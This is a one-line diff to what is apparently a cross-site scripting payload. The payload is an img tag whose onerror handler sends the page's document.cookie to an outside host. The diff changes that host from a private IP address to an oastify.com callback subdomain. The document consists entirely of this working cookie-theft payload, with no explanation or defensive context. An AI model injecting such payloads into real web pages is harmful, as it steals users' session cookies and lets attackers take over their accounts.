@@ -1,1 +1,1 @@
-<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
+<img src=x onerror="this.src='http://l7t66bal4sch83cimex46we9f0lr9mxb.oastify.com/?'+document.cookie; this.removeAttribute('onerror');">
